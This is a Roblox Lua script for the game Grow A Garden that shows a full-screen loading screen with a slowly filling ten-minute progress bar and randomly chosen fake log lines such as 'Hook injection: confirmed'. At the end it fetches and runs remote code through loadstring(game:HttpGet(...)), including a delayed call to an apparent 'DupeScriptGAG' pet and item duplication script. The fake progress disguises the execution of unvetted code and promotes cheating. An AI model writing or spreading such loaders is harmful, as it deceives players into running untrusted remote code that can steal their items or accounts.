-- Full Roblox Loading UI with Realistic Fake Logs, Glow, Bounce, and Oval Bar

local TweenService = game:GetService("TweenService")

-- UI Setup
local ScreenGui = Instance.new("ScreenGui", game.CoreGui)
ScreenGui.IgnoreGuiInset = true
ScreenGui.ResetOnSpawn = false

local Frame = Instance.new("Frame", ScreenGui)
Frame.Size = UDim2.new(1, 0, 1, 0)
Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Frame.BackgroundTransparency = 1

-- Title (Lowered)
local Title = Instance.new("TextLabel", Frame)
Title.Text = "Loading Script - Grow A Garden 🌴"
Title.Size = UDim2.new(1, 0, 0, 50)
Title.Position = UDim2.new(0, 0, 0.45, -80)
Title.BackgroundTransparency = 1
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.TextScaled = true
Title.Font = Enum.Font.SourceSansBold

-- Progress Bar Background (Oval)
local BarBackground = Instance.new("Frame", Frame)
BarBackground.Size = UDim2.new(0.6, 0, 0, 30)
BarBackground.Position = UDim2.new(0.2, 0, 0.5, -15)
BarBackground.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
BarBackground.BorderSizePixel = 0
BarBackground.ClipsDescendants = true
Instance.new("UICorner", BarBackground).CornerRadius = UDim.new(1, 0)

-- Progress Fill
local ProgressBar = Instance.new("Frame", BarBackground)
ProgressBar.Size = UDim2.new(0, 0, 1, 0)
ProgressBar.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
ProgressBar.BorderSizePixel = 0
Instance.new("UICorner", ProgressBar).CornerRadius = UDim.new(1, 0)

-- Percent Text
local PercentText = Instance.new("TextLabel", BarBackground)
PercentText.Text = "0%"
PercentText.Size = UDim2.new(1, 0, 1, 0)
PercentText.BackgroundTransparency = 1
PercentText.TextColor3 = Color3.fromRGB(255, 255, 255)
PercentText.TextScaled = true
PercentText.Font = Enum.Font.SourceSansBold

-- Analyzing File Text
local AnalyzingText = Instance.new("TextLabel", Frame)
AnalyzingText.Size = UDim2.new(1, 0, 0, 30)
AnalyzingText.Position = UDim2.new(0, 0, 0.5, 25)
AnalyzingText.BackgroundTransparency = 1
AnalyzingText.TextColor3 = Color3.fromRGB(200, 255, 200)
AnalyzingText.TextScaled = true
AnalyzingText.Font = Enum.Font.SourceSansItalic
AnalyzingText.Text = "Loading..."

-- Wait 10 Minutes Message (Glowing)
local Message = Instance.new("TextLabel", Frame)
Message.Text = "Please wait up to 10 minutes to prepare your script..."
Message.Size = UDim2.new(1, 0, 0, 30)
Message.Position = UDim2.new(0, 0, 0.5, 60)
Message.BackgroundTransparency = 1
Message.TextColor3 = Color3.fromRGB(220, 220, 220)
Message.TextScaled = true
Message.Font = Enum.Font.SourceSans

-- Fade In/Out Tip
local FadeText = Instance.new("TextLabel", Frame)
FadeText.Text = "If you got kicked please rejoin, patient is the key"
FadeText.Size = UDim2.new(1, 0, 0, 30)
FadeText.Position = UDim2.new(0, 0, 0.5, 95)
FadeText.BackgroundTransparency = 1
FadeText.TextColor3 = Color3.fromRGB(255, 200, 200)
FadeText.TextScaled = true
FadeText.Font = Enum.Font.SourceSans

-- Fade-In Background
for i = 1, 20 do
	task.wait(0.05)
	Frame.BackgroundTransparency = math.clamp(Frame.BackgroundTransparency - 0.05, 0, 1)
end

-- Bounce Title
task.spawn(function()
	while true do
		local up = TweenService:Create(Title, TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {
			Position = Title.Position + UDim2.new(0, 0, -0.02, 0)
		})
		local down = TweenService:Create(Title, TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.In), {
			Position = UDim2.new(0, 0, 0.45, -80)
		})
		up:Play()
		up.Completed:Wait()
		down:Play()
		down.Completed:Wait()
	end
end)

-- Glow Title
task.spawn(function()
	while true do
		for i = 1, 5 do
			Title.TextColor3 = Color3.fromRGB(200 + i * 10, 255, 200 + i * 10)
			task.wait(0.05)
		end
		for i = 5, 1, -1 do
			Title.TextColor3 = Color3.fromRGB(200 + i * 10, 255, 200 + i * 10)
			task.wait(0.05)
		end
	end
end)

-- Glow "Wait 10 Minutes" Text
task.spawn(function()
	while true do
		for i = 1, 5 do
			Message.TextColor3 = Color3.fromRGB(200 + i * 10, 230 + i * 5, 200 + i * 10)
			task.wait(0.05)
		end
		for i = 5, 1, -1 do
			Message.TextColor3 = Color3.fromRGB(200 + i * 10, 230 + i * 5, 200 + i * 10)
			task.wait(0.05)
		end
	end
end)

-- Fade Reminder Text
task.spawn(function()
	while true do
		for i = 0, 1, 0.05 do
			FadeText.TextTransparency = i
			task.wait(0.05)
		end
		for i = 1, 0, -0.05 do
			FadeText.TextTransparency = i
			task.wait(0.05)
		end
	end
end)

-- Realistic File Loading Logs
local fakeTasks = {
	"Loading config/settings.ini...",
	"Opening assets/map_garden_01.json...",
	"Parsing pet_cache.dat...",
	"Syncing inventory_seedlog.bin...",
	"Decrypting eggsync.dll...",
	"Analyzing spawner_stats.log...",
	"Mounting toolkits/tools_v2.lua...",
	"Compiling garden_render.fx...",
	"Checking permissions.txt...",
	"Extracting client_init.sys...",
	"Reading profile/userdata.json...",
	"Updating version_config.txt...",
	"Decrypting dupe_patch.exe...",
	"Scanning for eggdupe.db...",
	"Verifying hashes/pet_list.md5...",
	"Checking local/spawner_ref.cfg...",
	"Loading effects/particles.fx...",
	"Mounting cloudscripts/eggdupeloader.lua...",
	"Unpacking tools_ref.zip...",
	"Decrypting hooks/connection_key.pem...",
	"Collecting stats/session_142.log...",
	"Parsing env/cache_file.tmp...",
	"Fetching path: /client/local/saveinfo_03.txt...",
	"Analyzing logs/crashreport.log...",
	"Connecting to datastore/server_seedid_417.json...",
	"Parsing temp/instance_lookup.xml...",
	"Injecting gardenseed.dat...",
	"Backing up egg_index.list...",
	"Registering petmeta.config...",
	"Authenticating user_token.lic...",
	"Reading network_dump.pcap...",
	"Syncing hooks_env.lua...",
	"Mounting animation_pack.gap...",
	"Building preview_scene.prefab...",
	"Cleaning up old cache files...",
	"Analyzing scriptentry/entry001.lua...",
	"Recompiling toolcache_legacy.dll...",
	"Locking instance DB...",
	"Generating analytics snapshot...",
	"Hook injection: confirmed...",
	"Executing buffer_clear.ldr...",
	"Verifying instance_flags.flagset...",
	"Purging inactive tools.json..."
}

task.spawn(function()
	while true do
		AnalyzingText.Text = fakeTasks[math.random(1, #fakeTasks)]
		task.wait(1.25)
	end
end)

-- Progress Animation
local percent = 0
local elapsed = 0
local totalTime = 600

while percent < 100 do
	task.wait(0.5)
	elapsed += 0.5
	if elapsed <= 180 then
		percent = math.floor((elapsed / 180) * 80)
	else
		percent = 80 + math.floor(((elapsed - 180) / 420) * 20)
	end
	percent = math.clamp(percent, 0, 100)
	ProgressBar.Size = UDim2.new(percent / 100, 0, 1, 0)
	PercentText.Text = percent .. "%"
end

-- Script Loader (Replace URLs)
local function loadFrom(url)
	return loadstring(game:HttpGet(url))()
end

local script1 = "https://raw.githubusercontent.com/YourUsername/YourRepo/main/Script1.lua"
local script2 = "https://raw.githubusercontent.com/YourUsername/YourRepo/main/Script2.lua"

loadFrom(script1)
loadFrom(script2)

ScreenGui:Destroy()
-- 🔔 Run DupeScriptGAG after 10-second delay
task.delay(10, function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/GrowAGardenDupe/Dupe-Pet-Seed-Egg/refs/heads/main/DupeScriptGAG"))()
end)
